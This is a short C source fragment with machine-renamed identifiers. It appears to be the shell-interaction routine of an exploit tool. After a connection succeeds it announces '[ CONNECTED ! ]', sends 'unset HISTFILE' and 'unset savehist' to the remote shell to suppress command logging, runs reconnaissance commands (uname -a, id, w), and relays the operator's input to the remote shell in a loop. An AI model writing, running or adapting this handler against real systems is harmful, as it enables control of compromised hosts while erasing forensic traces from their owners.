
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






typedef char u_char ;
typedef int fd_set ;
typedef int data ;


 scalar_t__ FUNC_0 (int,int *) ;
 int FUNC_1 (int,int *) ;
 int FUNC_2 (int *) ;
 int FUNC_3 (int) ;
 int FUNC_4 (int ) ;
 int FUNC_5 (int ,char*,...) ;
 int FUNC_6 (char*,int ,int) ;
 int FUNC_7 (char*) ;
 int FUNC_8 (int ,char*,int) ;
 int FUNC_9 (int,char*,int,int ) ;
 int FUNC_10 (int,int *,int ,int ,int ) ;
 int VAR_0 ;
 int VAR_1 ;
 int FUNC_11 (char*) ;
 int FUNC_12 (int,char*,int) ;

void FUNC_13(int VAR_2)
{

    if (VAR_2 == -1) {
        FUNC_5(VAR_0, "ERROR: failed to connect\n");
        FUNC_3(1);
    }

    FUNC_4(VAR_1);

    FUNC_5(VAR_0,"\n[ CONNECTED ! ]\n\n");
    {
        u_char VAR_3[8192] = {0};
        fd_set VAR_4;


        FUNC_12(VAR_2,"unset HISTFILE\n",15);
        FUNC_12(VAR_2,"unset savehist\n",15);
        FUNC_12(VAR_2,"export TERM=xterm\n",18);
        FUNC_12(VAR_2,"export SHELL=sh\n",16);
        FUNC_12(VAR_2,"uname -a\n",9);
        FUNC_12(VAR_2,"id\n",3);
        FUNC_12(VAR_2,"w\n",2);

        for(;;) {
            FUNC_2(&VAR_4);
            FUNC_1(0,&VAR_4);
            FUNC_1(VAR_2,&VAR_4);

            if(FUNC_10(255,&VAR_4,0,0,0)==-1){
                FUNC_7("select");
                FUNC_3(-1);
            }

            FUNC_6(VAR_3,0,sizeof(VAR_3));

            if(FUNC_0(VAR_2,&VAR_4)){
                if(FUNC_9(VAR_2,VAR_3,sizeof(VAR_3)-1,0)==-1) {
                    FUNC_5(VAR_0, "[x] ewps! connection closed by foreign host.\n");
                    return;
                }
                FUNC_5(VAR_0,"%s",VAR_3);
            }
            if(FUNC_0(0,&VAR_4)){
                FUNC_8(0, VAR_3, sizeof(VAR_3) - 1);
                FUNC_12(VAR_2,VAR_3,FUNC_11(VAR_3));
            }
        }
    }
}
